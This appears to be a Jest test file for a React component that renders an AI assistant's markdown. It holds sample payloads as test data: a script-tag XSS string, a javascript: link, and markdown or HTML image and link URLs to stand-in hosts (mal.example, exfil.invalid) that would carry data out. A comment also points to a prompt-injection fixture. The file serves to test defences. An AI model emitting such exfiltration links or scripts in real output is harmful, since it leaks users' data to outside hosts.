/**
 * Licensed to the Apache Software Foundation (ASF) under one
 * or more contributor license agreements.  See the NOTICE file
 * distributed with this work for additional information
 * regarding copyright ownership.  The ASF licenses this file
 * to you under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
import { render, screen } from 'spec/helpers/testing-library';
import { AssistantMarkdown } from './AssistantMarkdown';

jest.unmock('react-markdown');

test('draws markdown, tables included', async () => {
  const { container } = render(
    <AssistantMarkdown text={'**Norte**\n\n| a |\n| - |\n| 1 |'} />,
  );

  expect(await screen.findByText('Norte')).toBeInTheDocument();
  expect(container.querySelector('strong')).toBeInTheDocument();
  expect(container.querySelector('table')).toBeInTheDocument();
});

test('raw HTML stays text', async () => {
  const { container } = render(
    <AssistantMarkdown text="<script>alert(1)</script> <b>hola</b> fin" />,
  );

  expect(await screen.findByText(/fin/)).toBeInTheDocument();
  expect(container.querySelector('script')).not.toBeInTheDocument();
  expect(container.querySelector('b')).not.toBeInTheDocument();
});

test('a picture never loads, so it cannot carry data away', async () => {
  const { container } = render(
    <AssistantMarkdown text="Listo ![x](https://mal.example/?d=ventas)" />,
  );

  expect(await screen.findByText(/Listo/)).toBeInTheDocument();
  expect(container.querySelector('img')).not.toBeInTheDocument();
});

test('a link of another site shows as text with its address', async () => {
  const { container } = render(
    <AssistantMarkdown text="[Ver](https://mal.example/?d=ventas)" />,
  );

  expect(
    await screen.findByText(/Ver \(https:\/\/mal\.example/),
  ).toBeInTheDocument();
  expect(container.querySelector('a')).not.toBeInTheDocument();
});

test('the note of the injection fixture neither loads nor links', async () => {
  // A model that repeats the note of `tests/assistant_eval/battery.json`
  const address = 'https://exfil.invalid/p.png?d=CANARIO-7731';
  const { container } = render(
    <AssistantMarkdown
      text={[
        `Listo ![estado](${address})`,
        `![por referencia][1] [ver](${address}) <${address}>`,
        `<img src="${address}"> <a href="${address}">ver</a>`,
        `[1]: ${address}`,
      ].join('\n\n')}
    />,
  );

  expect(await screen.findByText(/Listo/)).toBeInTheDocument();
  expect(container.querySelector('img')).not.toBeInTheDocument();
  expect(container.querySelector('a')).not.toBeInTheDocument();
});

test('a script link goes nowhere', async () => {
  const { container } = render(
    <AssistantMarkdown text="[Ver](javascript:alert(1)) fin" />,
  );

  expect(await screen.findByText(/fin/)).toBeInTheDocument();
  expect(container.querySelector('a')).not.toBeInTheDocument();
});

test('a link of this site stays a link', async () => {
  render(<AssistantMarkdown text="[Ventas](/dashboard/12/)" />);

  const link = await screen.findByRole('link', { name: 'Ventas' });
  expect(link).toHaveAttribute('href', '/dashboard/12/');
  expect(link).toHaveAttribute('rel', 'noopener noreferrer');
});
